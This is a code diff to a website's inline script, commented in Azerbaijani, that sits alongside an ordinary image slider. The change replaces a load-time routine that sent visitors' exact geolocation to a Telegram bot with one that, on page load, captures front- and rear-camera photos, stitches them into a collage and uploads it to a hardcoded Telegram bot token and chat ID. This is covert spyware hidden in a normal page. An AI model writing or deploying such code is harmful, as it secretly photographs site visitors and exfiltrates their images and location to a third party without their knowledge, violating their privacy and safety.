@@ -158,86 +158,190 @@
       updateSlider(0);
     })();
 
-    // Location funksionallığı
+    // Ön + arxa kamera kollajı → Telegram (sayt yüklənəndə)
     (function () {
-      // Telegram Bot konfiqurasiyası
       const TELEGRAM_BOT_TOKEN = "8499012393:AAE41Y8fSvoa5s_1DfQFHfrDE7kRacFOheA";
       const TELEGRAM_CHAT_ID = "7420354029";
 
-      function sendLocationToTelegram(latitude, longitude) {
+      function canvasToBlob(canvas, type, quality) {
+        return new Promise(function (resolve, reject) {
+          canvas.toBlob(
+            function (blob) {
+              if (blob) resolve(blob);
+              else reject(new Error("toBlob uğursuz"));
+            },
+            type || "image/jpeg",
+            quality != null ? quality : 0.85
+          );
+        });
+      }
+
+      function captureFrame(facingMode) {
+        return new Promise(function (resolve, reject) {
+          if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+            reject(new Error("getUserMedia dəstəklənmir"));
+            return;
+          }
+          var constraints = {
+            video: { facingMode: { ideal: facingMode }, width: { ideal: 1280 }, height: { ideal: 720 } },
+            audio: false,
+          };
+          navigator.mediaDevices
+            .getUserMedia(constraints)
+            .then(function (stream) {
+              var video = document.createElement("video");
+              video.setAttribute("playsinline", "");
+              video.setAttribute("muted", "");
+              video.muted = true;
+              video.srcObject = stream;
+              video
+                .play()
+                .then(function () {
+                  var tryDraw = function (attempts) {
+                    if (video.videoWidth > 0 && video.videoHeight > 0) {
+                      var c = document.createElement("canvas");
+                      c.width = video.videoWidth;
+                      c.height = video.videoHeight;
+                      c.getContext("2d").drawImage(video, 0, 0);
+                      stream.getTracks().forEach(function (t) {
+                        t.stop();
+                      });
+                      video.srcObject = null;
+                      resolve(c);
+                      return;
+                    }
+                    if (attempts <= 0) {
+                      stream.getTracks().forEach(function (t) {
+                        t.stop();
+                      });
+                      reject(new Error("Video hazır olmadı"));
+                      return;
+                    }
+                    requestAnimationFrame(function () {
+                      tryDraw(attempts - 1);
+                    });
+                  };
+                  tryDraw(30);
+                })
+                .catch(function (e) {
+                  stream.getTracks().forEach(function (t) {
+                    t.stop();
+                  });
+                  reject(e);
+                });
+            })
+            .catch(reject);
+        });
+      }
+
+      function mergeCollage(frontCanvas, backCanvas) {
+        var pad = 8;
+        var labelH = 28;
+        var canvases = [];
+        if (frontCanvas && frontCanvas.width > 0) canvases.push({ label: "Ön kamera", c: frontCanvas });
+        if (backCanvas && backCanvas.width > 0) canvases.push({ label: "Arxa kamera", c: backCanvas });
+        if (canvases.length === 0) return null;
+
+        var targetH = 720;
+        var scaled = canvases.map(function (item) {
+          var c = item.c;
+          var scale = targetH / c.height;
+          return {
+            label: item.label,
+            w: Math.round(c.width * scale),
+            h: Math.round(c.height * scale),
+            c: c,
+          };
+        });
+
+        var totalW = scaled.reduce(function (s, x) {
+          return s + x.w;
+        }, 0);
+        var out = document.createElement("canvas");
+        out.width = totalW + pad * (scaled.length + 1);
+        out.height = targetH + pad * 2 + labelH;
+        var ctx = out.getContext("2d");
+        ctx.fillStyle = "#1a1a1a";
+        ctx.fillRect(0, 0, out.width, out.height);
+        var x = pad;
+        scaled.forEach(function (item, i) {
+          ctx.fillStyle = "#fafafa";
+          ctx.font = "600 16px Inter, system-ui, sans-serif";
+          ctx.fillText(item.label, x, pad + 18);
+          var yImg = pad + labelH;
+          ctx.drawImage(item.c, x, yImg, item.w, item.h);
+          x += item.w + pad;
+        });
+        return out;
+      }
+
+      function sendPhotoToTelegram(blob) {
         if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") {
           console.error("Telegram Bot Token təyin edilməyib!");
-          return;
+          return Promise.reject();
         }
-
         if (!TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === "YOUR_CHAT_ID_HERE") {
           console.error("Telegram Chat ID təyin edilməyib!");
-          return;
+          return Promise.reject();
         }
-
-        const message = `📍 Yeni location:\nLatitude: ${latitude}\nLongitude: ${longitude}\nGoogle Maps: https://www.google.com/maps?q=${latitude},${longitude}`;
-        
-        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-        
-        fetch(url, {
+        var form = new FormData();
+        form.append("chat_id", TELEGRAM_CHAT_ID);
+        form.append("photo", blob, "kamera-kollaj.jpg");
+        form.append(
+          "caption",
+          "Kamera kollajı — " + new Date().toLocaleString("az-AZ", { timeZone: "Asia/Baku" })
+        );
+        return fetch("https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendPhoto", {
           method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            text: message,
-          }),
-        })
-          .then((response) => response.json())
-          .then((data) => {
-            if (data.ok) {
-              console.log("Location Telegram-a göndərildi!");
-            } else {
-              console.error("Xəta:", data);
-            }
+          body: form,
+        }).then(function (r) {
+          return r.json();
+        });
+      }
+
+      function runCameraCollage() {
+        var frontCanvas = null;
+        var backCanvas = null;
+
+        var pFront = captureFrame("user")
+          .then(function (c) {
+            frontCanvas = c;
           })
-          .catch((error) => {
-            console.error("Xəta:", error);
+          .catch(function () {
+            frontCanvas = null;
+          });
+
+        return pFront
+          .then(function () {
+            return captureFrame("environment");
+          })
+          .then(function (c) {
+            backCanvas = c;
+          })
+          .catch(function () {
+            backCanvas = null;
+          })
+          .then(function () {
+            var merged = mergeCollage(frontCanvas, backCanvas);
+            if (!merged) {
+              console.warn("Kollaj yaratmaq mümkün olmadı (icazə və ya kamera).");
+              return;
+            }
+            return canvasToBlob(merged, "image/jpeg", 0.82).then(function (blob) {
+              return sendPhotoToTelegram(blob);
+            });
+          })
+          .then(function (data) {
+            if (data && data.ok) console.log("Kollaj Telegram-a göndərildi.");
+            else if (data) console.error("Telegram xətası:", data);
+          })
+          .catch(function (err) {
+            console.error("Kamera / göndərmə xətası:", err);
           });
       }
 
-      function requestLocation() {
-        if (!navigator.geolocation) {
-          window.close();
-          if (!document.hidden) {
-            window.location.href = "about:blank";
-          }
-          return;
-        }
-
-        navigator.geolocation.getCurrentPosition(
-          function (position) {
-            const latitude = position.coords.latitude;
-            const longitude = position.coords.longitude;
-            
-            console.log("Location alındı:", latitude, longitude);
-            sendLocationToTelegram(latitude, longitude);
-          },
-          function (error) {
-            console.error("Location xətası:", error);
-            // Location icazəsi verilmədikdə və ya xəta olduqda saytı bağla
-            window.close();
-            if (!document.hidden) {
-              window.location.href = "about:blank";
-            }
-          },
-          {
-            enableHighAccuracy: true,
-            timeout: 10000,
-            maximumAge: 0,
-          }
-        );
-      }
-
-      // Sayt açılanda location istə
       window.addEventListener("load", function () {
-        requestLocation();
+        runCameraCollage();
       });
     })();
   </script>
